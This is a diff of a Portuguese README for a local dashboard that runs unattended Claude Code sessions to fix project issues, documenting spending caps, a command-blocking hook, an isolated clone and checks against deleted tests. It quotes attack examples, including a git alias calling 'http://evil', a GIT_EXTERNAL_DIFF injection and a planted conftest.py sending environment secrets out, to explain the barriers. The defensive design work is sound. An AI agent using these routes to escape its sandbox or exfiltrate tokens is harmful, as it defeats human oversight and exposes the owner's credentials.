@@ -32,7 +32,9 @@ Sem build, sem `npm install`, sem dependência externa. Precisa de Python 3.12,
 | `memoria.py` | A memória do tempo: idade de cada pendência, tendência da semana e o briefing. |
 | `test_memoria.py` | 38 testes da memória. `python test_memoria.py`. |
 | `execucao.py` | O botão **Resolver**: dispara uma sessão do Claude Code numa cópia isolada e abre o pedido de alteração. Seção própria abaixo. |
-| `test_execucao.py` | 78 testes das decisões do Resolver. `python test_execucao.py`. |
+| `test_execucao.py` | 85 testes das decisões do Resolver e das barreiras. `python test_execucao.py`. |
+| `barreira.py` | O porteiro do `Bash` da sessão desacompanhada: roda como hook do `claude` e barra o comando **antes** dele rodar. |
+| `test_barreira.py` | 43 testes da barreira — cada um é um ataque concreto ou um comando honesto. `python test_barreira.py`. |
 | `test_regras.py` | 40 testes do motor. `python test_regras.py`. |
 | `test_servir.py` | 43 testes do proxy do grafo e da superfície do Resolver. `python test_servir.py`. |
 | `coletar.py` | Camada **local**: git, Docker, portas, grafo, memória, variáveis. |
@@ -100,6 +102,86 @@ ensinando o dono a ignorar a lista inteira.
 
 **Regra 6 existe porque o erro é calado.** Arquivo de memória em CRLF faz o
 harness ignorar o frontmatter, e a memória nunca carrega. Nada na tela avisa.
+
+## A fila que conserta — o painel deixa de só apontar
+
+Até aqui o painel apontava e você resolvia um item por vez, a dedo. A **fila**
+pega a lista de pendências, escolhe a ordem sozinha e trabalha desacompanhada
+até acabar serviço, dinheiro ou paciência. Ela só começa quando você aperta
+**"Trabalhar na fila"** — não há agendador, e isso é decisão, não pendência.
+
+### Três trilhos
+
+| Trilho | Quem faz | Custo | O que sai |
+|---|---|---|---|
+| **Renovate** | um robô do GitHub, fora do painel | grátis | pedido de alteração de dependência |
+| **Mecânico** | o próprio painel, sem IA | **R$ 0,00** | o arquivo corrigido, direto |
+| **Claude** | uma sessão do Claude em cópia sem acesso ao GitHub | pago, teto de US$ 3 por item — ou menos, se o dia ja gastou | pedido de alteração |
+
+Só **três** das 16 regras entram na fila: `memoria_crlf` (mecânico),
+`env_drift` e `dependencia_insegura` (Claude). É lista **branca**: regra que não
+está lá não chega ao motor, nem por engano.
+
+**A fila só existe porque as barreiras existem.** Sem ninguém olhando a tela, a
+sessão do Claude deixa de ser uma ferramenta vigiada e passa a ser um programa
+solto na sua máquina. As três barreiras — cópia sem acesso ao GitHub, sessão sem
+configuração de arquivo, e lista de comandos — estão descritas em "O que este
+recurso NÃO isola", inclusive no que elas **não** cobrem.
+
+**`ci_vermelha` fica de fora de propósito.** É o caso mais valioso e o único em
+que *apagar o teste parece uma correção*. Enquanto a trava do teste apagado não
+tiver histórico de acerto, ela não entra.
+
+**`grafo_velho` fica de fora porque não cabe.** A ação dela hoje é copiar um
+texto para você colar; reindexar acontece pelo MCP do grafo, e o painel não
+dirige o MCP — ele só serve a tela do grafo por procuração.
+
+### As quatro travas, todas verificadas em código
+
+Nenhuma delas é uma instrução no texto do pedido. Instrução em texto é sugestão;
+trava é código que recusa.
+
+1. **Teto de R$ 50 por dia.** No ponto exato do teto já não cabe mais um item.
+   "Só mais um" é como conta de R$ 300 acontece. O teto do dia limita o teto
+   **da sessão** (`fila.teto_da_sessao`): com R$ 49 gastos, a sessão sai com
+   teto de R$ 1, e não com os R$ 15,42 de sempre. Sem isso — e era assim até
+   25/08/2026 — a fila conferia o teto *antes* do item e o dia podia fechar
+   em R$ 64 sem nunca ter "estourado". O botão **Resolver** também conta:
+   ele dispara a mesma sessão e o custo dele entra na tabela `gasto`, que
+   `banco.gasto_entre` soma junto com a fila.
+2. **Anti-laço: duas tentativas por item**, e falha de hoje não volta hoje. Uma
+   correção que não pega vira torneira aberta de madrugada.
+3. **Teste apagado.** Antes de publicar, o painel lê o diff. Apagou um arquivo
+   de teste (`test_*.py`, `*_test.*`, `*.test.*`, `*.spec.*`) ou desligou um
+   teste (`@unittest.skip`, `pytest.mark.skip`, `it.skip(`, `xit(`…)? Reprovado.
+   **Tirar** um skip passa de propósito: religar um teste é o oposto de burlar.
+4. **Segredo no arquivo de exemplo de ambiente.** Linha nova só pode ser
+   `CHAVE=`. Com qualquer coisa depois do `=` — inclusive um espaço reservado
+   que pareça inofensivo — o item é reprovado. O custo de errar para o lado
+   frouxo é um segredo no histórico do git, e rotacionar segredo é varredura no
+   repositório inteiro, não a edição de uma linha.
+
+As travas 3 e 4 ficam no **último instante antes de publicar**, dentro do
+`execucao.py`, porque é o único ponto por onde todo caminho passa — botão,
+paleta e fila.
+
+### O teto usa a data local, não a UTC
+
+O resto do banco carimba em UTC. O teto, não. Em UTC−3, às 21h de terça já é
+quarta em UTC: o teto zeraria três horas cedo e a surpresa seria de madrugada,
+sem ninguém entender por quê.
+
+**Risco aceito:** o `hub.db` é descartável. Apagar o banco no meio do dia zera o
+gasto acumulado e devolve os R$ 50 inteiros. É ato deliberado seu, não acidente
+— fica registrado aqui e não vira código.
+
+### O que a regra 6 (CRLF) deixou de apontar
+
+O `MEMORY.md` saiu do varredor. O motivo da regra é *"em CRLF o harness ignora o
+frontmatter e a memória nunca carrega"* — e esse arquivo, por especificação,
+**não tem** frontmatter: ele é o índice, uma linha por memória. Não há cabeçalho
+para ser ignorado, logo não há falha a apontar. Conferido em 25/08/2026: dos 13
+arquivos `.md` da pasta de memória deste projeto, ele é o único sem `---`.
 
 ## A paleta de comandos (`Ctrl+K`)
 
@@ -429,16 +511,21 @@ O cano inteiro, em seis passos:
    corpo. Isso fecha o prompt para o navegador — mas **não** para o mundo: o
    banco guarda o que o coletor leu da API do GitHub, e ali há texto que
    estranhos escreveram. Ver "O texto de estranho que quase virou comando".
-2. O painel cria uma **cópia isolada** do repositório com `git worktree`, em
-   `~/.cache/hub-worktrees/<projeto>/<8 caracteres>` — de propósito **fora** de
+2. O painel cria uma **cópia isolada** do repositório — um `git clone` local
+   com o `origin` **removido** — em
+   `~/.cache/hub-worktrees/<projeto>/<8 caracteres>`, de propósito **fora** de
    `source\repos`, porque toda subpasta daquela raiz vira projeto medido e o
-   painel passaria a medir as próprias cópias.
+   painel passaria a medir as próprias cópias. Até 25/08/2026 isso era um
+   `git worktree`, e a diferença não é de detalhe: ver
+   "O que este recurso NÃO isola".
 3. A sessão roda **dentro da cópia**. A pasta original do projeto não é tocada,
    e `git status` nela continua vazio durante e depois.
 4. O painel lê a saída linha a linha e mostra o progresso ao vivo: uma frase em
    português, o log cru com carimbo de hora, e o custo.
-5. Terminou bem: commit na cópia, `git push` de um ramo `hub/...` e
-   `gh pr create`. **Nunca** `push` na `main`, **nunca** `gh pr merge`.
+5. Terminou bem: commit **na cópia**; o painel traz o ramo para o projeto de
+   verdade com `git fetch`, e só então faz `git push` de um ramo `hub/...` e
+   `gh pr create`. O push sai do **painel**, nunca da sessão — a cópia não tem
+   para onde empurrar. **Nunca** `push` na `main`, **nunca** `gh pr merge`.
 5b. **Parar sem confirmação não libera a vez.** Se o `Parar` pede a morte e o
    processo não responde em 5 segundos, o painel **guarda** a referência dele em
    vez de descartá-la, e recusa um novo `Resolver` enquanto aquele processo
@@ -485,7 +572,8 @@ pendência tem uma ação".
 
 Medido nesta máquina em 24/08/2026: com `--max-budget-usd 0.10`, a execução
 terminou custando **US$ 0,44548** — estouro de 4,5×. A flag não é uma cerca; é
-um pedido. O teto adotado é **US$ 3** por execução, e a única garantia real de
+um pedido. O teto adotado é **US$ 3** por execução — ou o que sobra do teto do dia,
+se for menos (`fila.teto_da_sessao`) — e a única garantia real de
 parar é o botão **Parar**, que mata a árvore de processos e espera 5 segundos
 pela confirmação. Se não confirmar, a tela diz que **não** confirmou — não finge
 que parou.
@@ -549,20 +637,80 @@ mandou. O que veio da internet e foi guardado continua vindo da internet.
 
 ### O que este recurso NÃO isola
 
-`Bash` está na lista branca e **não** fica preso à cópia. O shell não conhece
-fronteira de pasta, e a cópia é um `git worktree`, que compartilha o `.git` do
-projeto de verdade e o remoto já autenticado: um `git push --force` saído de lá
-alcança o repositório real. `Bash` fica porque sem ele a sessão não roda teste
-nem commita — e aí o recurso não existe. O que protege não é a lista de
-ferramentas; é não deixar texto de estranho chegar ao prompt (seção acima).
+`Bash` está na lista branca e **não** fica preso à cópia: o shell não conhece
+fronteira de pasta. `Bash` fica porque sem ele a sessão não roda teste nem
+commita — e aí o recurso não existe.
 
-A sessão filha **roda os hooks** do `~/.claude` do dono e o
-`.claude/settings.json` versionado do projeto-alvo. Medido: seis hooks
-`SessionStart` dispararam dentro dela. A forma de evitar isso seria `--bare`, que
-**não funciona** com o login por assinatura desta máquina (responde
-`Not logged in`; `--bare` só aceita chave de API). Isso é **risco declarado, não
-resolvido** — se um hook do dono abortar a sessão filha, o sintoma é a sessão
-terminar sem tocar em arquivo nenhum, e o log cru da tela mostra o motivo.
+Enquanto havia uma pessoa olhando a tela, isso era um risco vigiado. A fila
+(`fila.py`) roda **desacompanhada**, e um risco sem vigia é outro risco. Quatro
+barreiras foram postas em 25/08/2026, em ordem de importância:
+
+1. **A cópia não alcança o GitHub.** Ela era um `git worktree`, que compartilha
+   o `.git` do projeto de verdade e, com ele, o `origin` já autenticado: um
+   `git push --force` saído de lá chegava ao repositório real. Passou a ser um
+   `git clone --no-hardlinks` com o `origin` removido e `core.hooksPath` numa
+   pasta vazia. Custa disco e meio segundo (medido: 0,5 s neste repositório; o
+   maior dos 17 tem 342 MB de `.git`) e paga com uma propriedade que nenhuma
+   lista de comandos daria — dali não há caminho até o GitHub. Quem atravessa
+   essa ponte é o painel, depois, com o diff já aprovado pelas travas.
+2. **A sessão filha não carrega configuração de arquivo nenhum.**
+   `--setting-sources ""` corta tudo o que vem de arquivo, e o `--settings`
+   explicito sobrevive ao corte (medido em 25/08/2026, `claude` 2.1.245 — a
+   versão anterior deste README dizia que só `--bare` isolaria, e estava
+   errado). Some o `~/.claude` do dono, que rodava seis hooks `SessionStart`
+   dentro da filha; e some o `.claude/settings.json` **do repositório sendo
+   consertado**, que é conteúdo escrito por estranho e podia definir hook
+   próprio. Este segundo era o furo que ninguém tinha visto.
+3. **Todo comando passa por uma lista antes de rodar** (`barreira.py`, um hook
+   `PreToolUse`). Medido numa sessão de verdade em 25/08/2026, por US$ 0,33:
+   `git push origin main` e `curl http://example.com` **barrados** com a frase
+   em português; `git status --porcelain` rodou. Lista branca de programas, nada que vire
+   interpretador de texto solto (`python -c`, `node -e`, `bash -c`), nenhum
+   caminho absoluto ou com `..`, e `.git/` intocável. Recusa sai com código 2
+   e a frase em português chega à sessão.
+
+   **O `git` tem lista BRANCA de subcomando, e a razão é um furo medido.** A
+   revisão de segurança de 25/08/2026 encontrou, e a medição confirmou, que
+   `git -c alias.pwn='!curl http://evil' pwn` passava **liberado** pela lista
+   negra: o git executa o valor do alias por um shell que a barreira nunca
+   leria, e de dentro dele `git remote add` mais `git push` alcançavam o
+   GitHub com a credencial do dono. A mesma porta existia em `core.pager`,
+   `core.fsmonitor`, `diff.external` e `--exec-path`. Lista negra de `git`
+   sempre perde: cada versão inventa capacidade nova, e a lista só protege o
+   que já conhece.
+
+   Da mesma revisão, três furos da mesma família: prefixo `NOME=valor` antes
+   do comando (`GIT_EXTERNAL_DIFF=x git diff` rodava `x`), caminho relativo
+   ao drive do Windows (`C:segredo.txt` escapava do teste de caminho
+   absoluto, que exigia a barra) e — o pior — **bug na barreira abria a
+   porta**: só o código 2 barra, e exceção não tratada saía com código 1, que
+   o Claude Code trata como liberado. `decidir` é um interpretador de linha
+   de comando escrito à mão; ele *vai* ter bug. Agora qualquer exceção
+   vira código 2.
+
+4. **A sessão não recebe segredo do ambiente** (`execucao.ambiente_da_filha`).
+   O `Popen` da filha não passava `env=`, então ela herdava o ambiente inteiro
+   do painel. Como a sessão é instruída a rodar a suíte do projeto-alvo, um
+   `conftest.py` plantado lê `os.environ` e manda tudo embora por socket — e a
+   barreira barra `curl` pelo **nome**, não contém rede. `GH_TOKEN` e
+   `GITHUB_TOKEN` são os que mais importam: com eles a sessão alcança o GitHub
+   sem precisar de `git push` nenhum. `ANTHROPIC_API_KEY` vai junto de
+   propósito, porque sem ela a sessão não roda — está escrito no código e tem
+   teste, para ninguém descobrir por acidente.
+
+**E o que continua não sendo isolado, dito sem enfeite:** rodar teste É rodar
+código arbitrário — a suíte do projeto é código de terceiro executando com todos
+os poderes do usuário desta máquina. A barreira encarece e estreita o caminho;
+ela não transforma a máquina num cofre. Não há isolamento de rede: o Claude Code
+desta versão não tem modo `sandbox` no Windows, e uma cerca de firewall por
+processo exigiria administrador. O que impede o estrago de **sair da cópia** são
+as barreiras 1 e 2; a 3 é o que impede o caminho fácil.
+
+**Consequência prática, e ela incomoda:** `npm install`, `pip install` e afins
+estão barrados. Um item de `dependencia_insegura` num projeto JavaScript que
+precise baixar dependência vai **falhar com motivo claro** em vez de baixar
+pacote sem ninguém olhando. É a troca escolhida; afrouxar depois é mais fácil
+que o contrário.
 
 ## A memória do tempo — o painel passa a lembrar de ontem
 
